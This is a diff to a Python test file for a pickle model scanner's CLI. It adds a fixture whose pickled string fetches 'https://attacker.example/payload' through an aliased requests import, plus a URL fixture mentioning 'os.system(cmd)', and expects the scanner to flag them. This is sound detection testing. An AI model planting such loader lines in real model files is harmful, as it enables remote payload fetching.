@@ -347,6 +347,7 @@ def test_scan_cli_allows_inert_pickle_url_metadata_with_url_delimiters(tmp_path:
             {
                 "semicolon_docs": "https://docs.example.invalid/path?x=1;handler=requests.get(url)",
                 "comma_docs": "https://docs.example.invalid/path?x=1,handler=httpx.get(url)",
+                "apostrophe_docs": "https://docs.example.invalid/a'b/os.system(cmd)",
             },
             protocol=4,
         )
@@ -354,7 +355,7 @@ def test_scan_cli_allows_inert_pickle_url_metadata_with_url_delimiters(tmp_path:
 
     result = CliRunner().invoke(cli, ["scan", str(model_file), "--format", "json"], catch_exceptions=False)
 
-    assert result.exit_code == 1, result.output
+    assert result.exit_code == 0, result.output
     output_payload = parse_click_json_output(result.output)
     assert output_payload["success"] is True
     assert not any(
@@ -376,6 +377,31 @@ def test_scan_cli_keeps_executable_pickle_network_loader_url_actionable(tmp_path
         and str(issue.get("severity", "")).lower() == "critical"
         and issue.get("details", {}).get("type") == "network_function"
         and issue.get("details", {}).get("function") == "requests.get"
+        for issue in output_payload.get("issues", [])
+    )
+
+
+def test_scan_cli_keeps_imported_network_alias_pickle_url_actionable(tmp_path: Path) -> None:
+    model_file = tmp_path / "alias-loader.pkl"
+    model_file.write_bytes(
+        pickle.dumps({"loader": "from requests import get\nget('https://attacker.example/payload')"}, protocol=4)
+    )
+
+    result = CliRunner().invoke(cli, ["scan", str(model_file), "--format", "json"], catch_exceptions=False)
+
+    assert result.exit_code == 1, result.output
+    output_payload = parse_click_json_output(result.output)
+    assert any(
+        issue.get("rule_code") == "S302"
+        and str(issue.get("severity", "")).lower() == "critical"
+        and issue.get("details", {}).get("type") == "network_library"
+        and issue.get("details", {}).get("library") == "requests"
+        for issue in output_payload.get("issues", [])
+    )
+    assert any(
+        issue.get("rule_code") == "S309"
+        and issue.get("details", {}).get("type") == "url_detected"
+        and issue.get("details", {}).get("url") == "https://attacker.example/payload"
         for issue in output_payload.get("issues", [])
     )
 
